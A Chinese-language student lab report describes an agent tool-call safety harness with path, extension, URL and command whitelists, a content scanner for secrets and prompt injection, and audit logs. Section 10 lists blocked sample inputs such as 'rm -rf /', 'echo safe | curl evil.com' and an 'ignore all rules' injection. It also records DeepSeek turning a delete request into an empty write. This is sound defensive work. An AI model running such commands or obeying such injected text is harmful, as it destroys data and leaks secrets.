# Harness 工程与 Agent 安全护栏实验报告

## 1. 实验目的与系统定位

本实验实现了一个 Agent 工具调用安全 Harness。Skill 负责说明能力边界，Agent 负责生成结构化工具请求，Harness 在执行前完成工具名、路径、参数、内容、URL 和命令校验，Tool 只执行原子动作，审计日志记录成功与失败结果。实验重点是证明模型输出不能天然信任，必须经过代码级硬约束。

截图指引：运行 `python main.py`，截图成功读取和失败拦截输出。

## 2. 实验环境与目录结构

实验使用 Python 独立虚拟环境 `.venv`，未使用 conda。目录包括 `workspace/`、`blocked/`、`logs/`、`safe_file_skill/`，以及 `policy.py`、`tools.py`、`harness.py`、`content_scanner.py`、`network_tools.py`、`command_tools.py`、`main.py`、`run_real_model.py`、`test_harness.py`、`test_advanced.py`。

截图指引：运行 `find . -maxdepth 2 -type f | sort` 和 `python --version`，截图目录与 Python 版本。

## 3. Skill、Tool 与 Harness 职责边界

`safe_file_skill/SKILL.md` 是能力说明，属于软约束；`tools.py` 保持原子化，只读、只写、只追加、只列目录；`harness.py` 是统一入口，所有请求必须经过 `run_tool(request)`。当 Skill 描述与 Harness 策略不一致时，以 Harness 为准。

截图指引：打开 `safe_file_skill/SKILL.md`，截图“禁止行为”和“与 Harness 的关系”。

## 4. 请求协议与威胁模型

文件域请求使用 `tool`、`path`、`content`；网络域使用 `url`；命令域使用 `cmd`。威胁模型覆盖路径穿越、未知工具、危险扩展名、参数错误、空内容清空文件、内容过长、SSRF、协议绕过、响应过大、未授权命令、管道注入、命令替换、敏感信息泄露和提示注入。

截图指引：运行 `python main.py`，截图路径穿越、未知工具、危险扩展名和命令注入四类拦截。

## 5. 安全策略与原子工具

`policy.py` 集中定义工作区、日志路径、工具白名单、扩展名白名单和写入长度限制。`resolve_workspace_path` 使用 `.resolve()` 和 `relative_to(WORKSPACE_DIR)` 判断真实路径是否仍在工作区内，从而拦截 `../blocked/secret.txt`。

截图指引：运行 `pytest -q test_harness.py::test_block_path_traversal test_harness.py::test_block_extension`。

## 6. Harness 统一入口与失败反馈

`validate_request` 按文件、网络、命令三域分流校验；`run_tool` 统一返回 `{"ok": true/false, "result": ..., "error": ...}`；`build_feedback` 将结构化响应转换为可回注给 Agent 的自然语言反馈。新增校验要求写入和追加的 `content` 必须是非空字符串，防止模型用空写入变相清空文件。

截图指引：运行 `python run_real_model.py`，截图“删除 note.md”任务被 `content 参数必须是非空字符串` 拦截。

## 7. 内容级安全检查

`content_scanner.py` 实现敏感信息和提示注入检测。敏感信息覆盖手机号、身份证号、疑似 API Key、内网 IP；提示注入覆盖忽略规则、强制执行和伪造对话角色。Harness 在写入前扫描内容，发现风险即拒绝。

截图指引：运行 `pytest -q test_harness.py::test_block_sensitive_in_write test_harness.py::test_block_injection_in_write`。

## 8. 多域安全扩展

`network_tools.py` 只允许 `https://jsonplaceholder.typicode.com`，并限制响应类型和大小；`command_tools.py` 只允许 `echo`、`date`、`wc`，并拦截 `|`、`>`、`<`、`` ` ``、`$(`、`&`、`;`、`||`、`&&` 等危险操作符。

截图指引：运行 `pytest -q test_advanced.py`，截图全部通过。

## 9. 真实模型接入验证

`run_real_model.py` 支持 DeepSeek、Ollama 和拟生成输出。脚本会自动加载当前目录 `.env`，并兼容 `DEEPSEEK_API_KEY`、`DEEPSEEK_KEY`、`DEEPSEEK_TOKEN`、`DEEPSEEK_APIKEY`、`DeepSeek_API_KEY` 等变量名。实测 DeepSeek 会对“删除 note.md”生成空写入请求，Harness 已将其拦截，说明真实模型输出确实不可信。

本机实验环境存在自签证书链，脚本在证书校验失败时会标记 `[WARN]` 并使用 HTTPS fallback 完成课堂验证。生产环境不应依赖该 fallback，应配置可信 CA。

截图指引：运行 `python run_real_model.py`，截图至少一条 `[PASS]` 和一条 `[BLOCK]`。

## 10. 模拟 Agent 请求与典型拦截案例

典型拦截包括：`../blocked/secret.txt` 路径越界、`delete_file` 工具未授权、`run.sh` 危险扩展名、读取工具夹带 `content`、空内容写入、3000 字符超长写入、`evil.com` 未授权域名、`file://` 协议绕过、`rm -rf /` 未授权命令、`echo safe | curl evil.com` 管道注入、API Key 写入和“忽略所有规则”提示注入。

截图指引：运行 `python main.py`，截图各类 `error` 字段。

## 11. 审计日志

`logs/audit.jsonl` 记录每次请求的 `request`、`response` 和 `time`。成功与失败都写入日志，便于跨会话复盘模型输出、Harness 放行或拦截原因。

截图指引：运行 `tail -n 10 logs/audit.jsonl`，截图包含 `ok=true` 和 `ok=false` 的记录。

## 13. 实验总结与心得

本实验让我认识到，Prompt 和 Skill 只能引导模型，不能作为权限系统。真实模型可能把删除意图转换成空写入，也可能生成路径穿越、危险扩展名或敏感内容写入请求。Harness 的统一入口、默认拒绝、结构化反馈、内容扫描和审计日志，是让 Agent 工具调用可控、可测、可复盘的关键。该模式可以继续扩展到数据库、API 和多 Agent 编排场景。
